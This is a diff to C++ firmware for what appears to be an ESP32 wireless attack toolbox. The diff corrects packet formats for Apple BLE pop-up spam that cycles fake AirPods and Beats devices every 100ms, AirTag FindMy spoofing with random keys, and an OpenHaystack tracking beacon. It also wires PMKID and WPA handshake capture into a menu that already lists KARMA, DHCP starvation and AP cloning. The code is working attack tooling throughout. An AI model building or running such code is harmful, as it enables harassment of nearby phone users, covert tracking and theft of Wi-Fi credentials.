@@ -1138,15 +1138,16 @@ static int s_appleDevIdx = 0;
 
 // Apple proximity pairing device types (manufacturer data prefix after 0x4C 0x00)
 // Format: length, type 0x07 (proximity pair), device model bytes
-static const uint8_t APPLE_DEVICES[][4] = {
-    {0x07, 0x19, 0x07, 0x14},  // AirPods Pro
-    {0x07, 0x19, 0x07, 0x02},  // AirPods
-    {0x07, 0x19, 0x07, 0x0E},  // AirPods Pro 2
-    {0x07, 0x19, 0x07, 0x0A},  // AirPods Max
-    {0x07, 0x19, 0x07, 0x06},  // Beats Solo Pro
-    {0x07, 0x19, 0x07, 0x10},  // Beats Fit Pro
-    {0x07, 0x19, 0x07, 0x05},  // Beats X
-    {0x07, 0x19, 0x07, 0x03},  // Powerbeats 3
+// Device IDs from Flipper Zero / Bruce — 2-byte big-endian
+static const uint16_t APPLE_DEVICE_IDS[] = {
+    0x0E20,  // AirPods Pro
+    0x0220,  // AirPods
+    0x1420,  // AirPods Pro 2
+    0x0A20,  // AirPods Max
+    0x0620,  // Beats Solo Pro
+    0x1020,  // Beats Fit Pro
+    0x0520,  // Beats X
+    0x0320,  // Powerbeats 3
 };
 static const char* APPLE_NAMES[] = {
     "AirPods Pro", "AirPods", "AirPods Pro 2", "AirPods Max",
@@ -1166,25 +1167,35 @@ static void appleSpamStart() {
 
 static void appleSpamTick() {
     uint32_t now = millis();
-    if (now - s_appleSpamLastMs < 100) return;  // switch device every 100ms
+    if (now - s_appleSpamLastMs < 100) return;
     s_appleSpamLastMs = now;
 
     s_pAdv->stop();
 
-    // Build Apple manufacturer data
-    // Company ID 0x004C (Apple) + proximity pairing data
-    uint8_t mfgData[16];
-    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple company ID (little-endian)
-    // Copy device type bytes
-    memcpy(mfgData + 2, APPLE_DEVICES[s_appleDevIdx], 4);
-    // Random status bytes
-    mfgData[6] = random(0, 256);
-    mfgData[7] = random(0, 256);
-    mfgData[8] = 0x00;
+    // Build ProximityPair packet — exact format from Bruce/Flipper Zero
+    // Uses addData() NOT setManufacturerData() to avoid double AD wrapping
+    uint16_t devId = APPLE_DEVICE_IDS[s_appleDevIdx];
+    uint8_t buf[31];
+    uint8_t i = 0;
+    buf[i++] = 0x1E;  // AD length (30 bytes follow)
+    buf[i++] = 0xFF;  // AD type: manufacturer specific
+    buf[i++] = 0x4C;  // Apple company ID
+    buf[i++] = 0x00;
+    buf[i++] = 0x07;  // Continuity type: ProximityPair
+    buf[i++] = 0x19;  // Continuity size: 25
+    buf[i++] = 0x07;  // Prefix: new device popup
+    buf[i++] = (uint8_t)(devId >> 8);
+    buf[i++] = (uint8_t)(devId & 0xFF);
+    buf[i++] = 0x55;  // Status
+    esp_fill_random(&buf[i], 3);  // Battery levels (random)
+    i += 3;
+    buf[i++] = 0x00;  // Color
+    buf[i++] = 0x00;  // Reserved
+    esp_fill_random(&buf[i], 16);  // "Encrypted payload" (random)
+    i += 16;
 
     NimBLEAdvertisementData advData;
-    advData.setFlags(0x06);  // general discoverable + BR/EDR not supported
-    advData.setManufacturerData(std::string((char*)mfgData, 9));
+    advData.addData(buf, i);
 
     s_pAdv->setAdvertisementData(advData);
     s_pAdv->start();
@@ -1690,23 +1701,24 @@ static void airtagSpoofStart() {
 
 static void airtagSpoofTick() {
     uint32_t now = millis();
-    if (now - s_airtagLastMs < 2000) return;  // AirTags advertise every 2s
+    if (now - s_airtagLastMs < 2000) return;
     s_airtagLastMs = now;
     s_pAdv->stop();
 
-    // Apple FindMy / AirTag advertisement
-    // Company ID 0x004C, type 0x12 (FindMy), length 0x19
-    uint8_t mfgData[29];
-    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple
-    mfgData[2] = 0x12; mfgData[3] = 0x19;  // FindMy type + length
-    mfgData[4] = 0x10;  // status byte
-    // Random public key bytes (28 bytes of the EC P-224 public key)
-    for (int i = 5; i < 29; i++) mfgData[i] = random(0, 256);
-    mfgData[5] = (mfgData[5] & 0x3F) | 0x40;  // key type bits
-
+    // AirTag FindMy — use addData() with correct AD structure
+    uint8_t buf[31];
+    uint8_t i = 0;
+    buf[i++] = 0x1E;  // AD length
+    buf[i++] = 0xFF;  // AD type: manufacturer specific
+    buf[i++] = 0x4C;  // Apple
+    buf[i++] = 0x00;
+    buf[i++] = 0x12;  // Continuity type: FindMy
+    buf[i++] = 0x19;  // Size: 25
+    buf[i++] = 0x10;  // Status
+    esp_fill_random(&buf[i], 24);  // Random key bytes
+    i += 24;
     NimBLEAdvertisementData advData;
-    advData.setFlags(0x06);
-    advData.setManufacturerData(std::string((char*)mfgData, 29));
+    advData.addData(buf, i);
 
     s_pAdv->setAdvertisementData(advData);
     s_pAdv->start();
@@ -1765,19 +1777,21 @@ static void haystackTick() {
     s_haystackLastMs = now;
     s_pAdv->stop();
 
-    // OpenHaystack FindMy beacon: all 28 key bytes in manufacturer data
-    // Note: full OpenHaystack protocol also encodes key bits in the BLE
-    // address, but NimBLE doesn't expose address control. This simplified
-    // version puts the full key in the payload for tracking via custom tools.
-    uint8_t mfgData[33];
-    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple
-    mfgData[2] = 0x12; mfgData[3] = 0x19;  // FindMy
-    mfgData[4] = 0x10;                       // status
-    memcpy(mfgData + 5, s_haystackKey, 28);  // full 28-byte key
+    // OpenHaystack FindMy beacon — uses addData() for correct AD format
+    uint8_t buf[31];
+    uint8_t i = 0;
+    buf[i++] = 0x1E;  // AD length
+    buf[i++] = 0xFF;  // AD type: manufacturer specific
+    buf[i++] = 0x4C;  // Apple
+    buf[i++] = 0x00;
+    buf[i++] = 0x12;  // FindMy
+    buf[i++] = 0x19;  // Size: 25
+    buf[i++] = 0x10;  // Status
+    memcpy(&buf[i], s_haystackKey, 24);  // 24 key bytes that fit
+    i += 24;
 
     NimBLEAdvertisementData advData;
-    advData.setFlags(0x06);
-    advData.setManufacturerData(std::string((char*)mfgData, 33));
+    advData.addData(buf, i);
 
     s_pAdv->setAdvertisementData(advData);
     s_pAdv->start();
@@ -4313,7 +4327,21 @@ static bool handleWifiTap(int idx) {
         case WifiTool::KARMA:          launchTool(ActiveTool::KARMA); break;
         case WifiTool::DHCP_STARVE:    launchTool(ActiveTool::DHCP_STARVE); break;
         case WifiTool::PCAP_CAPTURE:   launchTool(ActiveTool::PCAP_CAPTURE); break;
-        case WifiTool::AP_CLONE:       // Clone from menu needs scan first
+        case WifiTool::PMKID_CAPTURE:
+        case WifiTool::HANDSHAKE_CAPTURE:
+            // Need a target — scan first if no results, else use first/selected
+            if (s_scanCount > 0) {
+                int target = (s_scanSelected >= 0 && s_scanSelected < s_scanCount) ? s_scanSelected : 0;
+                handshakeCaptureStart(target);
+                s_activeTool = ActiveTool::HANDSHAKE_CAP;
+                s_toolActive = true;
+                s_toolStartMs = millis();
+                s_level = ToolboxLevel::TOOL_RUNNING;
+            } else {
+                launchTool(ActiveTool::WIFI_SCAN);  // scan first
+            }
+            break;
+        case WifiTool::AP_CLONE:
             if (s_scanCount > 0) { cloneApStart(0); launchTool(ActiveTool::CLONE_AP); }
             else launchTool(ActiveTool::WIFI_SCAN);
             break;
